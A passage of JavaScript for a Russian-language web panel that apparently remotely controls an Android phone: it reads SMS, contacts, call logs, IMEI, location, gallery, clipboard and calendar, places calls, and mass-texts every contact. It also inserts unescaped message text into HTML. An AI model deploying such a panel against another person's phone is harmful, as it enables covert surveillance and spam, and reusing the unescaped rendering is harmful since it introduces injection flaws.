          $('#callsStatus').textContent = 'телефон не подключён';
          $('#callsStatus').classList.remove('on');
        }
      } else if (m.type === 'phone-info') {
        renderPhoneInfo(m);
      } else if (m.type === 'call-log') {
        renderCallLog(m.entries || []);
      } else if (m.type === 'call-log-error') {
        $('#callLogBody').innerHTML = `<tr><td colspan="4" style="color:var(--danger)">${m.msg || 'Ошибка'}</td></tr>`;
      } else if (m.type === 'contacts') {
        renderContacts(m.entries || []);
      } else if (m.type === 'contacts-error') {
        $('#contactList').innerHTML = `<li style="color:var(--danger)">${m.msg || 'Ошибка'}</li>`;
      } else if (m.type === 'call-status') {
        toast(m.msg || (m.ok ? 'Звонок отправлен' : 'Ошибка'), !m.ok);
      } else if (m.type === 'sms-list') {
        renderSmsList(m.messages || []);
      } else if (m.type === 'sms-error') {
        $('#smsList').innerHTML = `<p style="color:var(--danger);padding:10px">${m.msg || 'Ошибка'}</p>`;
      } else if (m.type === 'sms-status') {
        toast(m.msg || (m.ok ? 'Отправлено' : 'Ошибка'), !m.ok);
        showSmsStatus(m.ok, m.msg || (m.ok ? 'Отправлено' : 'Ошибка'));
        if (m.ok) { $('#smsText').value = ''; phoneSend({ cmd: 'get-sms' }); }
      } else if (m.type === 'sms-incoming') {
        injectIncomingSms(m);
        toast(`📩 СМС от ${m.address}`);
      } else if (m.type === 'sms-broadcast-progress') {
        const done = m.sent + m.failed;
        const pct = m.total > 0 ? Math.round(done / m.total * 100) : 0;
        $('#broadcastFill').style.width = pct + '%';
        if (!m.current) {
          $('#broadcastStatus').textContent = `Контактов найдено: ${m.total}`;
          $('#broadcastCount').textContent = m.total;
        } else {
          $('#broadcastStatus').textContent = `${done} / ${m.total} — ${m.current}`;
          // Добавляем строку в список результатов
          const log = $('#broadcastLog');
          if (log) {
            const row = document.createElement('div');
            row.className = 'bc-row ' + (m.ok ? 'bc-ok' : 'bc-fail');
            row.innerHTML = `<span class="bc-icon">${m.ok ? '✓' : '✗'}</span><span class="bc-name">${m.current}</span><span class="bc-num">${m.number || ''}</span>${m.ok ? '' : `<span class="bc-err">${m.err || ''}</span>`}`;
            log.appendChild(row);
            log.scrollTop = log.scrollHeight;
          }
        }
      } else if (m.type === 'system-info') {
        renderSystemInfo(m);
      } else if (m.type === 'volume-info') {
        renderVolumeInfo(m.streams || {});
      } else if (m.type === 'bluetooth-status') {
        if (!m.ok && m.msg) toast('Bluetooth: ' + m.msg, true);
        else { setToggleBtn($('#cmdBtToggle'), m.enabled); toast(m.enabled ? '🔵 Bluetooth включён' : 'Bluetooth выключен'); }
      } else if (m.type === 'torch-status') {
        if (!m.ok && m.msg) toast('Фонарик: ' + m.msg, true);
        else { setToggleBtn($('#cmdTorchToggle'), m.enabled); toast(m.enabled ? '🔦 Фонарик включён' : 'Фонарик выключен'); }
      } else if (m.type === 'clipboard-text') {
        const el = $('#clipText');
        if (el) el.textContent = m.text || '(пусто)';
        if (m.err) toast('Буфер: ' + m.err, true);
      } else if (m.type === 'clipboard-set') {
        toast(m.ok ? 'Буфер обмена записан' : ('Ошибка: ' + (m.msg || '')), !m.ok);
      } else if (m.type === 'alarm-set') {
        toast(m.ok ? ('✓ ' + (m.msg || 'Будильник поставлен')) : ('Ошибка: ' + (m.msg || '')), !m.ok);
      } else if (m.type === 'timer-set') {
        toast(m.ok ? ('✓ ' + (m.msg || 'Таймер запущен')) : ('Ошибка: ' + (m.msg || '')), !m.ok);
      } else if (m.type === 'location') {
        renderLocation(m);
      } else if (m.type === 'gallery-items') {
        renderGallery(m);
      } else if (m.type === 'media-thumb') {
        applyMediaThumb(m);
      } else if (m.type === 'calendar-events') {
        renderCalendar(m);
      } else if (m.type === 'sms-broadcast-done') {
        $('#broadcastBtn').disabled = false;
        $('#broadcastBtn').textContent = '📢 Разослать';
        $('#broadcastBtn').classList.remove('danger-btn');
        if (m.ok) {
          $('#broadcastFill').style.width = '100%';
          $('#broadcastStatus').textContent = `✓ Отправлено: ${m.sent}, ошибок: ${m.failed}`;
          toast(`Рассылка завершена: ${m.sent} отправлено`);
        } else {
          $('#broadcastStatus').textContent = `✗ ${m.msg}`;
          toast(m.msg || 'Ошибка рассылки', true);
        }
      }
    } catch {}
  };
  wsPhone.onclose = () => {
    $('#callsStatus').textContent = 'нет соединения';
    $('#callsStatus').classList.remove('on');
    setTimeout(startCallsViewer, 3000);
  };
  wsPhone.onerror = () => {};
}

let allContacts = [];

const PERM_DEFS = [
  { key: 'camera',        icon: '📷', label: 'Камера' },
  { key: 'mic',           icon: '🎤', label: 'Микрофон' },
  { key: 'accessibility', icon: '👆', label: 'Управление (Accessibility)' },
  { key: 'projection',    icon: '🖥',  label: 'Захват экрана' },
  { key: 'phone',         icon: '📞', label: 'Звонки и телефон' },
  { key: 'contacts',      icon: '👥', label: 'Контакты' },
  { key: 'sms',          icon: '💬', label: 'СМС' },
];

function renderPhoneInfo(info) {
  $('#callsStatus').textContent = 'подключён';
  $('#callsStatus').classList.add('on');
  const rows = [];
  if (info.model) rows.push(`<b>Модель</b><span>${info.model}</span>`);
  if (info.number) rows.push(`<b>Номер</b><span>${info.number}</span>`);
  if (info.imei) rows.push(`<b>IMEI</b><span>${info.imei}</span>`);
  if (info.operator) rows.push(`<b>Оператор</b><span>${info.operator}</span>`);
  if (info.networkType) rows.push(`<b>Сеть</b><span>${info.networkType}</span>`);
  $('#phoneInfoKv').innerHTML = rows.length ? rows.join('') : '—';
  const simsEl = $('#simsKv');
  if (info.sims && info.sims.length) {
    simsEl.innerHTML = info.sims.map((s) =>
      `<b>SIM ${s.slot}</b><span>${s.displayName || s.carrierName}${s.number ? ' · ' + s.number : ''}</span>`
    ).join('');
  } else {
    simsEl.innerHTML = '';
  }
  // Обновляем дашборд — батарея
  if (info.battery != null) {
    const pct = info.battery;
    $('#batteryFill').style.width = pct + '%';
    $('#batteryFill').style.background = pct < 20 ? 'var(--danger)' : pct < 40 ? '#f0a030' : 'var(--accent)';
    $('#batteryText').textContent = pct + '%';
    $('#batteryKv').innerHTML = `<b>Заряд</b><span>${pct}%</span>`;
  }
  // Обновляем дашборд — устройство
  if (info.model) {
    const cur = $('#infoKv').innerHTML;
    if (!cur || cur === '—') {
      $('#infoKv').innerHTML = `<b>Модель</b><span>${info.model}</span>`
        + (info.operator ? `<b>Оператор</b><span>${info.operator}</span>` : '')
        + (info.networkType ? `<b>Сеть</b><span>${info.networkType}</span>` : '');
    }
  }
  // Обновляем дашборд — разрешения
  const permsEl = $('#permsKv');
  if (permsEl && info.perms) {
    permsEl.innerHTML = PERM_DEFS.map((d) => {
      const ok = info.perms[d.key];
      return `<b>${d.icon} ${d.label}</b><span class="${ok ? 'perm-ok' : 'perm-no'}">${ok ? '✓ Разрешено' : '✗ Не выдано'}</span>`;
    }).join('');
  }
}

function renderContacts(entries) {
  allContacts = entries;
  filterContacts($('#contactSearch').value);
}

function filterContacts(q) {
  const list = $('#contactList');
  const query = (q || '').toLowerCase().trim();
  const filtered = query
    ? allContacts.filter((c) => c.name.toLowerCase().includes(query) || c.number.includes(query))
    : allContacts;
  if (!filtered.length) {
    list.innerHTML = `<li style="color:var(--muted);padding:8px">${allContacts.length ? 'Не найдено' : 'Контакты пусты'}</li>`;
    return;
  }
  list.innerHTML = filtered.map((c) =>
    `<li class="contact-item">
      <span class="contact-name">${c.name || c.number}</span>
      <span class="contact-num">${c.name ? c.number : ''}</span>
      <button class="sm contact-sms" data-num="${c.number}" data-name="${(c.name || '').replace(/"/g, '&quot;')}" title="Написать СМС">💬</button>
      <button class="sm contact-call" data-num="${c.number}">📞</button>
    </li>`
  ).join('');
  list.querySelectorAll('.contact-call').forEach((btn) => {
    btn.onclick = () => phoneSend({ cmd: 'call', number: btn.dataset.num });
  });
  list.querySelectorAll('.contact-sms').forEach((btn) => {
    btn.onclick = () => openSmsFor(btn.dataset.num, btn.dataset.name);
  });
}

function renderCallLog(entries) {
  const tbody = $('#callLogBody');
  if (!entries.length) {
    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--muted)">Журнал пуст</td></tr>';
    return;
  }
  tbody.innerHTML = entries.map((e) => {
    const typeLabel = e.callType === 'incoming' ? '📥 Вход'
      : e.callType === 'outgoing' ? '📤 Исход'
      : e.callType === 'missed' ? '📵 Пропущен' : '— Другое';
    const name = e.name ? `${e.name}<small>${e.number}</small>` : e.number || '—';
    const date = e.date ? new Date(e.date).toLocaleString('ru-RU', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }) : '';
    const dur = e.duration > 0 ? `${Math.floor(e.duration / 60)}:${String(e.duration % 60).padStart(2, '0')}` : '—';
    return `<tr><td class="type-${e.callType}">${typeLabel}</td><td>${name}</td><td>${date}</td><td>${dur}</td></tr>`;
  }).join('');
}

function phoneSend(obj) {
  if (wsPhone && wsPhone.readyState === WebSocket.OPEN) wsPhone.send(JSON.stringify(obj));
}

function startCallsTab() {
  if (wsPhone && wsPhone.readyState === WebSocket.OPEN) {
    phoneSend({ cmd: 'get-phone-info' });
    phoneSend({ cmd: 'get-call-log' });
    phoneSend({ cmd: 'get-contacts' });
  } else {
    startCallsViewer(true);
  }
}

$('#callBtn').onclick = () => {
  const num = $('#dialInput').value.trim();
  if (!num) { toast('Введи номер', true); return; }
  phoneSend({ cmd: 'call', number: num });
};
$('#dialInput').addEventListener('keydown', (e) => { if (e.key === 'Enter') $('#callBtn').click(); });
$('#refreshCallLog').onclick = () => phoneSend({ cmd: 'get-call-log' });
$('#refreshContacts').onclick = () => phoneSend({ cmd: 'get-contacts' });
$('#contactSearch').addEventListener('input', (e) => filterContacts(e.target.value));

// ---------- СМС ----------
let pendingSmsFor = null; // { number, name } — открыть тред после загрузки списка

function openSmsFor(number, name) {
  pendingSmsFor = { number, name };
  // Переключаем на вкладку СМС (как клик по табу)
  document.querySelectorAll('.tab').forEach((t) => t.classList.toggle('active', t.dataset.tab === 'sms'));
  document.querySelectorAll('.tab-content').forEach((c) => c.classList.toggle('active', c.id === 'tab-sms'));
  startCallsTab();
  phoneSend({ cmd: 'get-sms' });
  // Если список уже загружен — сразу открываем тред
  tryOpenPendingThread();
}

function tryOpenPendingThread() {
  if (!pendingSmsFor) return;
  const { number, name } = pendingSmsFor;
  const addrEnc = encodeURIComponent(number);
  const thread = $('#smsList').querySelector(`.sms-thread[data-addr="${addrEnc}"]`);
  if (thread) {
    pendingSmsFor = null;
    thread.scrollIntoView({ behavior: 'smooth', block: 'start' });
    const msgs = thread.querySelector('.sms-messages');
    if (msgs) msgs.style.display = 'block';
    const input = thread.querySelector('.sms-inline-input');
    if (input) setTimeout(() => input.focus(), 100);
  } else {
    // Тред не найден — заполняем поле «Кому» в форме отправки наверху
    $('#smsTo').value = number;
    pendingSmsFor = null;
  }
}

function smsTimeStr(date) {
  return new Date(date).toLocaleString('ru-RU', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
}

function smsMsgHtml(m) {
  return `<div class="sms-msg ${m.type === 2 ? 'sms-out' : 'sms-in'}">
    <span class="sms-msg-body">${m.body || ''}</span>
    <span class="sms-msg-time">${smsTimeStr(m.date)}</span>
  </div>`;
}

function bindThreadEvents(el) {
  const header  = el.querySelector('.sms-thread-header');
  const preview = el.querySelector('.sms-preview');
  const msgs    = el.querySelector('.sms-messages');
  const sendBtn = el.querySelector('.sms-inline-send');
  const input   = el.querySelector('.sms-inline-input');
  [header, preview].forEach((h) => h.onclick = () => {
    msgs.style.display = msgs.style.display === 'none' ? 'block' : 'none';
    if (msgs.style.display === 'block') { msgs.scrollTop = msgs.scrollHeight; input && input.focus(); }
  });
  if (sendBtn && input) {
    const addr = decodeURIComponent(el.dataset.addr);
    const doSend = () => {
      const text = input.value.trim();
      if (!text) return;
      phoneSend({ cmd: 'send-sms', number: addr, text });
      input.value = '';
    };
    sendBtn.onclick = (e) => { e.stopPropagation(); doSend(); };
    input.onkeydown = (e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); doSend(); } };
  }
}

function renderSmsList(messages) {
  const container = $('#smsList');
  if (!messages.length) {
    container.innerHTML = '<p style="color:var(--muted);text-align:center;padding:20px">Нет сообщений</p>';
    return;
  }
  const threads = {};
  for (const m of messages) {
    const addr = m.address || 'Неизвестный';
    if (!threads[addr]) threads[addr] = [];
    threads[addr].push(m);
  }
  const sorted = Object.entries(threads).sort(([, a], [, b]) => b[0].date - a[0].date);
  container.innerHTML = sorted.map(([addr, msgs]) => {
    const last = msgs[0];
    const displayName = last.name || addr;
    const preview = (last.body || '').slice(0, 70) + (last.body && last.body.length > 70 ? '…' : '');
    const typeIcon = last.type === 2 ? '📤' : '📥';
    const unread = msgs.filter((m) => m.type === 1 && !m.read).length;
    const addrEnc = encodeURIComponent(addr);
    return `<div class="sms-thread" data-addr="${addrEnc}">
      <div class="sms-thread-header">
        <span class="sms-addr">${displayName}</span>${displayName !== addr ? `<span class="sms-num">${addr}</span>` : ''}
        ${unread ? `<span class="sms-unread">${unread}</span>` : ''}
        <span class="sms-date">${relTime(last.date)}</span>
      </div>
      <div class="sms-preview">${typeIcon} ${preview}</div>
      <div class="sms-messages" style="display:none">
        <div class="sms-msgs-scroll">${msgs.map(smsMsgHtml).join('')}</div>
        <div class="sms-inline-row">
          <textarea class="sms-inline-input" placeholder="Текст…" rows="1"></textarea>
          <button class="sms-inline-send">📤</button>
        </div>
      </div>
    </div>`;
  }).join('');
  container.querySelectorAll('.sms-thread').forEach(bindThreadEvents);
  tryOpenPendingThread();
}

function injectIncomingSms(m) {
  const addr = m.address || 'Неизвестный';
  const displayName = m.name || addr;
  const addrEnc = encodeURIComponent(addr);
  const container = $('#smsList');
  let thread = container.querySelector(`.sms-thread[data-addr="${addrEnc}"]`);
  if (thread) {
    // добавить сообщение в существующий тред
    const scroll = thread.querySelector('.sms-msgs-scroll');
    if (scroll) {
      scroll.insertAdjacentHTML('beforeend', smsMsgHtml({ ...m, type: 1 }));
      scroll.scrollTop = scroll.scrollHeight;
    }
    // переместить тред наверх
    container.prepend(thread);
    // обновить превью и убрать badge
    const unreadEl = thread.querySelector('.sms-unread');
    if (unreadEl) unreadEl.textContent = parseInt(unreadEl.textContent || '0') + 1;
    else thread.querySelector('.sms-thread-header').insertAdjacentHTML('afterbegin', `<span class="sms-unread" style="order:-1">1</span>`);
    thread.querySelector('.sms-preview').textContent = '📥 ' + (m.body || '').slice(0, 70);
    thread.querySelector('.sms-date').textContent = relTime(m.date);
  } else {
    // новый контакт — вставить тред наверх
    const div = document.createElement('div');
    div.className = 'sms-thread';
    div.dataset.addr = addrEnc;
    div.innerHTML = `
      <div class="sms-thread-header">
        <span class="sms-addr">${displayName}</span>${displayName !== addr ? `<span class="sms-num">${addr}</span>` : ''}
        <span class="sms-unread">1</span>
        <span class="sms-date">${relTime(m.date)}</span>
      </div>
      <div class="sms-preview">📥 ${(m.body || '').slice(0, 70)}</div>
      <div class="sms-messages" style="display:none">
        <div class="sms-msgs-scroll">${smsMsgHtml({ ...m, type: 1 })}</div>
        <div class="sms-inline-row">
          <textarea class="sms-inline-input" placeholder="Текст…" rows="1"></textarea>
          <button class="sms-inline-send">📤</button>
        </div>
      </div>`;
    container.prepend(div);
    bindThreadEvents(div);
  }
}

function showSmsStatus(ok, msg) {
  const el = $('#smsSendStatus');
  if (!el) return;
  el.textContent = msg;
  el.className = 'sms-send-status ' + (ok ? 'ok' : 'err');
  clearTimeout(showSmsStatus._t);
  if (ok) showSmsStatus._t = setTimeout(() => { el.textContent = ''; el.className = 'sms-send-status'; }, 3000);
}

// ---------- Массовая рассылка ----------
let broadcastReady = false;

$('#broadcastToggle').onclick = () => {
  const body = $('#broadcastBody');
  const chevron = $('#broadcastChevron');
  const open = body.style.display === 'none';
  body.style.display = open ? 'block' : 'none';
  chevron.textContent = open ? '▲' : '▼';
};

$('#broadcastBtn').onclick = () => {
  if (!broadcastReady) {
    const text = $('#broadcastText').value.trim();
    if (!text) { toast('Введи текст для рассылки', true); return; }
    broadcastReady = true;
    $('#broadcastWarn').style.display = 'block';
    $('#broadcastCancelBtn').style.display = '';
    $('#broadcastBtn').textContent = '✓ Подтвердить';
    $('#broadcastBtn').classList.add('danger-btn');
  } else {
    const text = $('#broadcastText').value.trim();
    if (!text) { toast('Введи текст для рассылки', true); return; }
    broadcastReady = false;
    $('#broadcastWarn').style.display = 'none';
    $('#broadcastCancelBtn').style.display = 'none';
    $('#broadcastBtn').textContent = '⏳ Отправка…';
    $('#broadcastBtn').disabled = true;
    $('#broadcastProgress').style.display = 'block';
    $('#broadcastStatus').textContent = 'Подготовка…';
    $('#broadcastLog').innerHTML = '';
    phoneSend({ cmd: 'send-sms-broadcast', text });
  }
};

$('#broadcastCancelBtn').onclick = () => {
  broadcastReady = false;
  $('#broadcastWarn').style.display = 'none';
  $('#broadcastCancelBtn').style.display = 'none';
  $('#broadcastBtn').textContent = '📢 Разослать';
  $('#broadcastBtn').classList.remove('danger-btn');
};

$('#sendSmsBtn').onclick = () => {
  const number = $('#smsTo').value.trim();
  const text = $('#smsText').value.trim();
  if (!number) { toast('Введи номер', true); return; }
  if (!text) { toast('Введи текст', true); return; }
  phoneSend({ cmd: 'send-sms', number, text });
};
$('#refreshSms').onclick = () => phoneSend({ cmd: 'get-sms' });

// ---------- Команды ----------
function loadCommandsTab() {
  phoneSend({ cmd: 'get-system-info' });
  phoneSend({ cmd: 'get-volume' });
  if (_leafletMap) setTimeout(() => _leafletMap.invalidateSize(), 100);
}

function renderSystemInfo(m) {
  const fmt = (b) => {
    if (b == null) return '—';
    const gb = b / 1024 / 1024 / 1024;
    return gb >= 1 ? gb.toFixed(1) + ' ГБ' : (b / 1024 / 1024).toFixed(0) + ' МБ';
  };
  const rows = [];
  if (m.ramTotal != null) {
    const used = m.ramTotal - m.ramAvail;
    rows.push(`<b>💾 RAM</b><span>${fmt(used)} / ${fmt(m.ramTotal)}</span>`);
  }
  if (m.storIntTotal != null) {
    const used = m.storIntTotal - m.storIntFree;
    rows.push(`<b>📦 Хранилище</b><span>${fmt(used)} / ${fmt(m.storIntTotal)}</span>`);
  }
  if (m.storExtTotal != null) {
    const used = m.storExtTotal - m.storExtFree;
    rows.push(`<b>📦 SD-карта</b><span>${fmt(used)} / ${fmt(m.storExtTotal)}</span>`);
  }
  if (m.batteryTemp != null) rows.push(`<b>🌡 Батарея</b><span>${m.batteryTemp.toFixed(1)} °C</span>`);
  if (m.cpuTemp != null) rows.push(`<b>🌡 CPU</b><span>${m.cpuTemp.toFixed(1)} °C</span>`);
  if (m.bluetoothEnabled != null) {
    rows.push(`<b>🔵 Bluetooth</b><span>${m.bluetoothEnabled ? 'Включён' : 'Выключен'}</span>`);
    setToggleBtn($('#cmdBtToggle'), m.bluetoothEnabled);
  }
  const el = $('#sysInfoKv');
  if (el) el.innerHTML = rows.length ? rows.join('') : '<span style="color:var(--muted)">Нет данных</span>';
}

function renderVolumeInfo(streams) {
  document.querySelectorAll('.vol-slider').forEach((sl) => {
    const s = streams[sl.dataset.stream];
    if (!s) return;
    sl.max = s.max;
    sl.value = s.current;
    const val = sl.closest('.vol-row')?.querySelector('.vol-val');
    if (val) val.textContent = `${s.current}/${s.max}`;
  });
}

function setToggleBtn(btn, on) {
  if (!btn) return;
  btn.dataset.state = on ? 'on' : 'off';
  btn.textContent = on ? 'Вкл' : 'Выкл';
  btn.classList.toggle('on', on);
}

$('#cmdBtToggle').onclick = () => {
  phoneSend({ cmd: 'set-bluetooth', enabled: $('#cmdBtToggle').dataset.state !== 'on' });
};
$('#cmdTorchToggle').onclick = () => {
  phoneSend({ cmd: 'set-torch', enabled: $('#cmdTorchToggle').dataset.state !== 'on' });
};

$('#vibrateMs').addEventListener('input', () => {
  $('#vibrateMsVal').textContent = $('#vibrateMs').value + ' мс';
});
$('#cmdVibrate').onclick = () => phoneSend({ cmd: 'vibrate', ms: parseInt($('#vibrateMs').value) });

const volSliderTimers = {};
document.querySelectorAll('.vol-slider').forEach((sl) => {
  sl.addEventListener('input', () => {
    const stream = sl.dataset.stream;
    const val = sl.closest('.vol-row')?.querySelector('.vol-val');
    if (val) val.textContent = `${sl.value}/${sl.max}`;
    clearTimeout(volSliderTimers[stream]);
    volSliderTimers[stream] = setTimeout(() => {
      phoneSend({ cmd: 'set-volume', stream, value: parseInt(sl.value) });
    }, 250);
  });
});

$('#cmdClipRead').onclick = () => phoneSend({ cmd: 'get-clipboard' });
$('#cmdClipWrite').onclick = () => {
  const text = $('#clipWriteInput').value;
  if (!text) { toast('Введи текст', true); return; }
  phoneSend({ cmd: 'set-clipboard', text });
};

$('#cmdSetAlarm').onclick = () => {
  const [hour, minute] = ($('#alarmTime').value || '08:00').split(':').map(Number);
  const label = $('#alarmLabel').value || 'Будильник';
  phoneSend({ cmd: 'set-alarm', hour: hour || 0, minute: minute || 0, label });
};

$('#cmdSetTimer').onclick = () => {
  const min = parseInt($('#timerMin').value) || 0;
  const sec = parseInt($('#timerSec').value) || 0;
  const seconds = min * 60 + sec;
  if (!seconds) { toast('Укажи время таймера', true); return; }
  const label = $('#timerLabel').value || 'Таймер';
  phoneSend({ cmd: 'set-timer', seconds, label });
};

// ---------- Геолокация ----------
let _leafletMap = null;
let _locDot = null;
let _locCircle = null;

$('#cmdGetLocation').onclick = () => {
  const el = $('#locationCoords');
  if (el) el.textContent = 'Запрос…';
  phoneSend({ cmd: 'get-location' });
};

function renderLocation(m) {
  const coordsEl = $('#locationCoords');
  if (m.err) {
    if (coordsEl) coordsEl.textContent = 'Ошибка: ' + m.err;
    return;
  }
  const acc = m.accuracy ? m.accuracy.toFixed(0) + ' м' : '?';
  const ago = m.time ? relTime(m.time) : '';
  if (coordsEl) coordsEl.textContent = `${m.lat.toFixed(6)}, ${m.lon.toFixed(6)} · ±${acc}${ago ? ' · ' + ago : ''}`;

  const ph = $('#locationMapPh');
  const mapDiv = $('#leafletMap');
  if (!ph || !mapDiv) return;
  ph.style.display = 'none';
  mapDiv.style.display = 'block';

  if (!_leafletMap) {
    _leafletMap = L.map('leafletMap', { zoomControl: true, attributionControl: false })
      .setView([m.lat, m.lon], 16);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      maxZoom: 19,
      subdomains: 'abcd'
    }).addTo(_leafletMap);
    _locDot = L.circleMarker([m.lat, m.lon], {
      radius: 9, fillColor: '#3fb950', color: '#fff', weight: 2, fillOpacity: 1
    }).addTo(_leafletMap);
    if (m.accuracy) {
      _locCircle = L.circle([m.lat, m.lon], {
        radius: m.accuracy, color: '#388bfd', weight: 1, fillOpacity: 0.12
      }).addTo(_leafletMap);
    }
  } else {
    _leafletMap.setView([m.lat, m.lon], _leafletMap.getZoom());
    if (_locDot) _locDot.setLatLng([m.lat, m.lon]);
    if (_locCircle) { _locCircle.remove(); _locCircle = null; }
    if (m.accuracy) {
      _locCircle = L.circle([m.lat, m.lon], {
        radius: m.accuracy, color: '#388bfd', weight: 1, fillOpacity: 0.12
      }).addTo(_leafletMap);
    }
    setTimeout(() => _leafletMap.invalidateSize(), 50);
  }
}

// ---------- Галерея ----------
let galleryOffset = 0;
let galleryType = 'images';
const GALLERY_LIMIT = 20;
let galleryTotal = 0;

function loadGallery(offset) {
  galleryOffset = offset || 0;
  phoneSend({ cmd: 'get-gallery', mediaType: galleryType, limit: GALLERY_LIMIT, offset: galleryOffset });
  const el = $('#galleryList');
  if (el) el.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Загрузка…</div>';
}

function formatBytes(b) {
  if (!b) return '';
  if (b < 1024 * 1024) return (b / 1024).toFixed(0) + ' КБ';
  return (b / 1024 / 1024).toFixed(1) + ' МБ';
}

function renderGallery(m) {
  const list = $('#galleryList');
  const pager = $('#galleryPager');
  const info = $('#galleryInfo');
  if (!list) return;
  galleryTotal = m.total || 0;
  if (m.err) { list.innerHTML = `<div class="muted-text" style="padding:10px">${m.err}</div>`; return; }
  const items = m.items || [];
  if (!items.length) { list.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Нет файлов</div>'; return; }
  if (info) info.textContent = `Всего: ${galleryTotal}`;
  list.innerHTML = items.map((item) => {
    const date = item.date ? new Date(item.date).toLocaleString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' }) : '';
    const size = formatBytes(item.size);
    return `<div class="gallery-item">
      <div class="gallery-thumb" data-id="${item.id}" data-mtype="${m.mediaType}">${m.mediaType === 'videos' ? '🎬' : '📷'}</div>
      <div class="gallery-meta-col">
        <div class="gallery-name">${item.name || ''}</div>
        <div class="gallery-sub">${date}${size ? ' · ' + size : ''}</div>
      </div>
      ${item.path ? `<button class="sm gallery-dl" data-path="${item.path.replace(/"/g, '&quot;')}" title="Скачать">⬇</button>` : ''}
    </div>`;
  }).join('');
  list.querySelectorAll('.gallery-thumb[data-id]').forEach((el) => {
    phoneSend({ cmd: 'get-media-thumb', id: parseInt(el.dataset.id), mediaType: el.dataset.mtype });
  });
  list.querySelectorAll('.gallery-dl').forEach((btn) => {
    btn.onclick = () => window.open('/api/files/download?path=' + encodeURIComponent(btn.dataset.path));
  });
  if (pager) {
    const shown = galleryOffset + items.length;
    const hasMore = shown < galleryTotal;
    const hasPrev = galleryOffset > 0;
    pager.style.display = (hasMore || hasPrev) ? '' : 'none';
    const pg = $('#galleryPage');
    if (pg) pg.textContent = `${galleryOffset + 1}–${shown} из ${galleryTotal}`;
  }
}

function applyMediaThumb(m) {
  if (!m.data || !m.id) return;
  const el = document.querySelector(`.gallery-thumb[data-id="${m.id}"]`);
  if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${m.data}" style="width:100%;height:100%;object-fit:cover;border-radius:4px">`;
}

document.querySelectorAll('.gallery-tab-btn').forEach((btn) => {
  btn.onclick = () => {
    document.querySelectorAll('.gallery-tab-btn').forEach((b) => b.classList.remove('active'));
    btn.classList.add('active');
    galleryType = btn.dataset.gtype;
  };
});
$('#cmdLoadGallery').onclick = () => loadGallery(0);
$('#galleryPrev').onclick = () => loadGallery(Math.max(0, galleryOffset - GALLERY_LIMIT));
$('#galleryNext').onclick = () => loadGallery(galleryOffset + GALLERY_LIMIT);

// ---------- Календарь ----------
$('#cmdLoadCalendar').onclick = () => {
  const days = parseInt($('#calDays').value) || 14;
  const list = $('#calendarList');
  if (list) list.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Загрузка…</div>';
  phoneSend({ cmd: 'get-calendar', days });
};

function renderCalendar(m) {
  const list = $('#calendarList');
  if (!list) return;
  if (m.err) { list.innerHTML = `<div class="muted-text" style="padding:10px">${m.err}</div>`; return; }
  const events = m.events || [];
  if (!events.length) { list.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Нет событий</div>'; return; }
  list.innerHTML = events.map((e) => {
    const start = new Date(e.dtstart);
    const startStr = e.allDay
      ? start.toLocaleDateString('ru-RU', { day: 'numeric', month: 'long', year: 'numeric' })
      : start.toLocaleString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' });
    let endStr = '';
    if (e.dtend && !e.allDay) {
      const end = new Date(e.dtend);
      const sameDay = start.toDateString() === end.toDateString();
      endStr = ' — ' + (sameDay
        ? end.toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' })
        : end.toLocaleString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' }));
    }
    return `<div class="cal-event">
      <div class="cal-time">${startStr}${endStr}</div>
      <div class="cal-title">${e.title || '(Без названия)'}</div>
      ${e.location ? `<div class="cal-loc">📍 ${e.location}</div>` : ''}
      ${e.calendar ? `<div class="cal-cal">${e.calendar}</div>` : ''}
    </div>`;
  }).join('');
}

// ---------- Старт ----------
loadDashboard();
showPicker();
